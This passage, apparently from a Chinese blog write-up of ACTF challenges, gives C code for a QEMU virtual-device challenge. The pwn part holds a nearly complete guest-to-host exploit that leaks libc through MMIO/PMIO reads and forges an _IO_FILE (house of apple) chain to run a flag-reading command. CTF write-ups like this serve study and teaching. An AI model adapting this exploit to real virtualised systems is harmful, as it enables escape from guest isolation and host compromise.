class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_SYNC|O_RDWR);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open mmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;get mmio_mem failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);<br><br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open pmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">// 00:0000â”‚ rbx 0x56043c8e1fa8 â—‚â€” 0xaba29ec2a98dd89a                                                     </span><br><span class="hljs-comment">// 01:0008â”‚     0x56043c8e1fb0 â—‚â€” 0xbbf1b4ab81b4a9d4                                                     </span><br><span class="hljs-comment">// 02:0010â”‚     0x56043c8e1fb8 â—‚â€” 0xfb92a48db386ffa8                                                     </span><br><span class="hljs-comment">// 03:0018â”‚     0x56043c8e1fc0 â—‚â€” 0xefb491b8afb4abd3                                                     </span><br><span class="hljs-comment">// 04:0020â”‚ r11 0x56043c8e1fc8 â—‚â€” 0x80ef69f1cbd00397                                                    </span><br><span class="hljs-comment">// 05:0028â”‚     0x56043c8e1fd0 â—‚â€” 0xb2eb07859cda52d3                                                     </span><br><span class="hljs-comment">// 06:0030â”‚     0x56043c8e1fd8 â—‚â€” 0xec9e22f5a5a07fa3                                                 </span><br><span class="hljs-comment">// 07:0038â”‚     0x56043c8e1fe0 â—‚â€” 0x4b36df7b5b655a84 </span><br><br><span class="hljs-comment">// 00:0000â”‚ rbx 0x559cbeef0fa8 â—‚â€” 0x7a1299023d29ff68                                                     </span><br><span class="hljs-comment">// 01:0008â”‚     0x559cbeef0fb0 â—‚â€” 0x702edf5e423bb634                                                     </span><br><span class="hljs-comment">// 02:0010â”‚     0x559cbeef0fb8 â—‚â€” 0x2653e2366369b36c                                                     </span><br><span class="hljs-comment">// 03:0018â”‚     0x559cbeef0fc0 â—‚â€” 0xd9a33790b594ae73                                                     </span><br><span class="hljs-comment">// 04:0020â”‚ r11 0x559cbeef0fc8 â—‚â€” 0xc9b59388b0adbfbe                                                     </span><br><span class="hljs-comment">// 05:0028â”‚     0x559cbeef0fd0 â—‚â€” 0x8bb287b5efbeaf84                                                     </span><br><span class="hljs-comment">// 06:0030â”‚     0x559cbeef0fd8 â—‚â€” 0x95b4a2838496a4f8                                                    </span><br><span class="hljs-comment">// 07:0038â”‚     0x559cbeef0fe0 â—‚â€” 0xc6ca9ad88681c5b4     </span><br><br><span class="hljs-comment">// 0x7f0f875f94a0 â—‚â€” 0x3525b76e0d25b76e</span><br><span class="hljs-comment">// 0x7f0f875f94a8 â—‚â€” 0xb5a5278efde5674e</span><br><span class="hljs-comment">// 0x7f0f875f94b0 â—‚â€” 0xb58517cead8517ce</span><br><span class="hljs-comment">// 0x7f0f875f94b8 â—‚â€” 0x3505e72e7d4527ee</span><br><br><span class="hljs-comment">// something_i_know ^ x = flag 0x559cbeef0570</span><br><br>    set_value(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7a1299023d29ff68</span>);<br>    set_value(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x702edf5e423bb634</span>);<br>    set_value(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2653e2366369b36c</span>);<br>    set_value(<span class="hljs-number">0x18</span>,<span class="hljs-number">0xd9a33790b594ae73</span>);<br>    set_value(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xc9b59388b0adbfbe</span>);<br>    set_value(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x8bb287b5efbeaf84</span>);<br>    set_value(<span class="hljs-number">0x30</span>,<span class="hljs-number">0x95b4a2838496a4f8</span>);<br>    set_value(<span class="hljs-number">0x38</span>,<span class="hljs-number">0xc6ca9ad88681c5b4</span>);<br>    <br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åæ¥ğŸ‘´çœ‹äº†arrçš„wpï¼ŒçŸ¥é“äº†è¿™è¾¹æ‰æ˜¯æ ¸å¿ƒ(ğŸ‘´æ˜¯ä¸ä¼šè¯´ğŸ‘´åˆšå¼€å§‹æŠŠåé¢çš„èµ‹å€¼å½“æˆæ ¸å¿ƒåœ¨çœ‹çš„ï¼ˆbushiï¼‰ï¼‰</p><p><img src="/img/ACTF/9.png" alt="img"></p><p>ğŸ‘´åŠ¨è°ƒäº†ä¸€ä¼šå‘ç°å¤§æ¦‚åº”è¯¥æˆ–è®¸å¯èƒ½æ˜¯ä¸€ä¸ªæœ‰ç‚¹éº»çƒ¦çš„å¼‚æˆ–ï¼Œåæ­£ğŸ‘´å‡ºflagäº†ä¸ç®¡äº†</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>ğŸ‘´ä¸€ç›´æä¸æ˜ç™½é‚£ä¸ª0xa31çš„åœ°æ–¹æ˜¯æ€ä¹ˆå˜æˆ1çš„</p><p>çœ‹äº†xtxå¸ˆå‚…çš„wpå‘ç°pmio_writeä¸¤æ¬¡å°±è¡Œäº†ï¼Œå•Šï¼Ÿ</p><p>é€†ä¸æ˜ç™½ï¼Œå°Šå˜Ÿé€†ä¸æ˜ç™½</p><p>åé¢å°±æ˜¯mmio_writeå¯ä»¥è¦†å†™0xa78ä½4ä½ï¼Œé€ æˆä»»æ„åœ°å€è¯»å†™</p><p>ç„¶ålibcæ³„éœ²å› ä¸ºåªæœ‰ä½4ä½å¯æ”¹ï¼Œæ‰¾äº†åŠå¤©ä¹Ÿæ‰¾ä¸åˆ°ï¼Œçœ‹äº†Esifielå¸ˆå‚…çš„å®˜æ–¹wpæ‰çŸ¥é“åŸæ¥pandbgè¿˜æœ‰è¿™ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">pwndbg&gt; leakfind <span class="hljs-number">0x7fff60000000</span> --max_offset=<span class="hljs-number">0x1000</span> --page_name=libc<br>        <span class="hljs-number">0x7fff60000000</span>+<span class="hljs-number">0x8a0</span> â€”â–¸ <span class="hljs-number">0x7ffff0000030</span>+<span class="hljs-number">0x870</span> â€”â–¸ <span class="hljs-number">0x7ffff6819c80</span> /usr/lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span><br></code></pre></td></tr></table></figure><p>å•Šï¼Ÿå•Šï¼Ÿå•Šï¼Ÿ</p><p>ğŸ¤¡</p><p>åé¢å°±æ˜¯æ‰“_IO_FILEï¼Œåœ¨å…³æœºçš„æ—¶å€™æŠŠflagå¸¦å‡ºæ¥ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯æœ€é¡ºæ‰‹çš„house of appleé“¾å­</p><p>ç„¶åå› ä¸ºåªæœ‰ä½å››å­—èŠ‚èƒ½è¦†ç›–ï¼Œæ³„éœ²libcå¤§æ¦‚æœ‰1&#x2F;2çš„æ¦‚ç‡offsetè¶…å‡ºå››å­—èŠ‚é™åˆ¶ï¼Œå›ç›´æ¥dumpæ‰ï¼Œè°ƒå¼çš„æ—¶å€™çœŸç»™ğŸ‘´å¹²ğŸ¤®ğŸŒ¶ï¸ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-comment">// #define PAGE_SHIFT 12</span><br><span class="hljs-comment">// #define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) // 4096</span><br><span class="hljs-comment">// #define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-comment">// #define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-comment">// #define PMIO_BASE 0x000000000000c000</span><br><span class="hljs-comment">// #define CSR(_x) ((_x) &lt;&lt; 3)</span><br><span class="hljs-comment">// #define CSR5_TS_SUSPENDED 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMIO_BASE 0XC040</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* mmio_mem;<br><span class="hljs-type">uint8_t</span> payload[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint32_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(PMIO_BASE + value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    outb(value,PMIO_BASE+addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_value</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    mmio_write(addr,value&amp;<span class="hljs-number">0xffffffff</span>);<br>    mmio_write(addr+<span class="hljs-number">4</span>,value&gt;&gt;<span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_payload</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> start_addr, <span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size / <span class="hljs-number">8</span>; ++i)&#123;<br>        mmio_write(<span class="hljs-number">0x40</span>, start_addr);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; ++j)&#123;<br>            pmio_write(j + <span class="hljs-number">0x10</span>, payload[i * <span class="hljs-number">8</span> + j]);<br>        &#125;<br>        start_addr += <span class="hljs-number">8</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> leak[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_SYNC|O_RDWR);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open mmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;get mmio_mem failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);<br><br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open pmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">// 00:0000â”‚ rbx 0x56043c8e1fa8 â—‚â€” 0xaba29ec2a98dd89a                                                     </span><br><span class="hljs-comment">// 01:0008â”‚     0x56043c8e1fb0 â—‚â€” 0xbbf1b4ab81b4a9d4                                                     </span><br><span class="hljs-comment">// 02:0010â”‚     0x56043c8e1fb8 â—‚â€” 0xfb92a48db386ffa8                                                     </span><br><span class="hljs-comment">// 03:0018â”‚     0x56043c8e1fc0 â—‚â€” 0xefb491b8afb4abd3                                                     </span><br><span class="hljs-comment">// 04:0020â”‚ r11 0x56043c8e1fc8 â—‚â€” 0x80ef69f1cbd00397                                                    </span><br><span class="hljs-comment">// 05:0028â”‚     0x56043c8e1fd0 â—‚â€” 0xb2eb07859cda52d3                                                     </span><br><span class="hljs-comment">// 06:0030â”‚     0x56043c8e1fd8 â—‚â€” 0xec9e22f5a5a07fa3                                                 </span><br><span class="hljs-comment">// 07:0038â”‚     0x56043c8e1fe0 â—‚â€” 0x4b36df7b5b655a84 </span><br><br><span class="hljs-comment">// 00:0000â”‚ rbx 0x559cbeef0fa8 â—‚â€” 0x7a1299023d29ff68                                                     </span><br><span class="hljs-comment">// 01:0008â”‚     0x559cbeef0fb0 â—‚â€” 0x702edf5e423bb634                                                     </span><br><span class="hljs-comment">// 02:0010â”‚     0x559cbeef0fb8 â—‚â€” 0x2653e2366369b36c                                                     </span><br><span class="hljs-comment">// 03:0018â”‚     0x559cbeef0fc0 â—‚â€” 0xd9a33790b594ae73                                                     </span><br><span class="hljs-comment">// 04:0020â”‚ r11 0x559cbeef0fc8 â—‚â€” 0xc9b59388b0adbfbe                                                     </span><br><span class="hljs-comment">// 05:0028â”‚     0x559cbeef0fd0 â—‚â€” 0x8bb287b5efbeaf84                                                     </span><br><span class="hljs-comment">// 06:0030â”‚     0x559cbeef0fd8 â—‚â€” 0x95b4a2838496a4f8                                                    </span><br><span class="hljs-comment">// 07:0038â”‚     0x559cbeef0fe0 â—‚â€” 0xc6ca9ad88681c5b4     </span><br><br><span class="hljs-comment">// 0x7f0f875f94a0 â—‚â€” 0x3525b76e0d25b76e</span><br><span class="hljs-comment">// 0x7f0f875f94a8 â—‚â€” 0xb5a5278efde5674e</span><br><span class="hljs-comment">// 0x7f0f875f94b0 â—‚â€” 0xb58517cead8517ce</span><br><span class="hljs-comment">// 0x7f0f875f94b8 â—‚â€” 0x3505e72e7d4527ee</span><br><br><span class="hljs-comment">// something_i_know ^ x = flag 0x559cbeef0570</span><br><br>    set_value(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7a1299023d29ff68</span>);<br>    set_value(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x702edf5e423bb634</span>);<br>    set_value(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2653e2366369b36c</span>);<br>    set_value(<span class="hljs-number">0x18</span>,<span class="hljs-number">0xd9a33790b594ae73</span>);<br>    set_value(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xc9b59388b0adbfbe</span>);<br>    set_value(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x8bb287b5efbeaf84</span>);<br>    set_value(<span class="hljs-number">0x30</span>,<span class="hljs-number">0x95b4a2838496a4f8</span>);<br>    set_value(<span class="hljs-number">0x38</span>,<span class="hljs-number">0xc6ca9ad88681c5b4</span>);<br>    <br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    pmio_write(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    pmio_write(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    leak[<span class="hljs-number">0</span>] = mmio_read(<span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">uint32_t</span> addr1 = <span class="hljs-number">0</span>;<br>    addr1 = (leak[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">24</span>) &lt;&lt; <span class="hljs-number">24</span>;<br><br>    mmio_write(<span class="hljs-number">0x40</span>,addr1 + <span class="hljs-number">0x8a0</span>);<br>    leak[<span class="hljs-number">0</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x10</span>);<br>    leak[<span class="hljs-number">1</span>] = pmio_read(<span class="hljs-number">4</span>+<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-type">uint64_t</span> addr2 = <span class="hljs-number">0</span>;<br>    addr2 = leak[<span class="hljs-number">1</span>] * <span class="hljs-number">0x100000000</span> + leak[<span class="hljs-number">0</span>];<br>    sleep(<span class="hljs-number">1</span>);<br>    mmio_write(<span class="hljs-number">0x40</span>,leak[<span class="hljs-number">0</span>]+<span class="hljs-number">0x8a0</span><span class="hljs-number">-0x30</span>);<br><br>    leak[<span class="hljs-number">0</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x10</span>);<br>    leak[<span class="hljs-number">1</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x14</span>);<br>    <br>    <span class="hljs-type">size_t</span> libc_address = <span class="hljs-number">0</span>;<br>    libc_address = (leak[<span class="hljs-number">1</span>]*<span class="hljs-number">0x100000000</span>) + leak[<span class="hljs-number">0</span>] - <span class="hljs-number">0x219c80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc_address is %lx&quot;</span>,libc_address);<br><br>    <span class="hljs-type">size_t</span> system_addr = <span class="hljs-number">0x50d70</span> + libc_address;<br>    <span class="hljs-type">size_t</span> stderr_addr = <span class="hljs-number">0x21a6a0</span> + libc_address;<br>    <span class="hljs-type">size_t</span> _IO_list_all = <span class="hljs-number">0x21a680</span> + libc_address;<br>    <span class="hljs-type">size_t</span> _IO_wfile_jumps = <span class="hljs-number">0x2160c0</span> + libc_address;<br><br>    <span class="hljs-built_in">memcpy</span>(payload, <span class="hljs-string">&quot;  cat flag &gt;&amp;2;&quot;</span>, <span class="hljs-number">0x10</span>);<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">20</span>] = addr2;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">27</span>] = _IO_wfile_jumps;<br>    send_payload(stderr_addr, <span class="hljs-number">0xe0</span>);<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">20</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = stderr_addr;<br>    send_payload(stderr_addr - <span class="hljs-number">0x20</span>, <span class="hljs-number">0x8</span>);<br>    <br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = addr2+<span 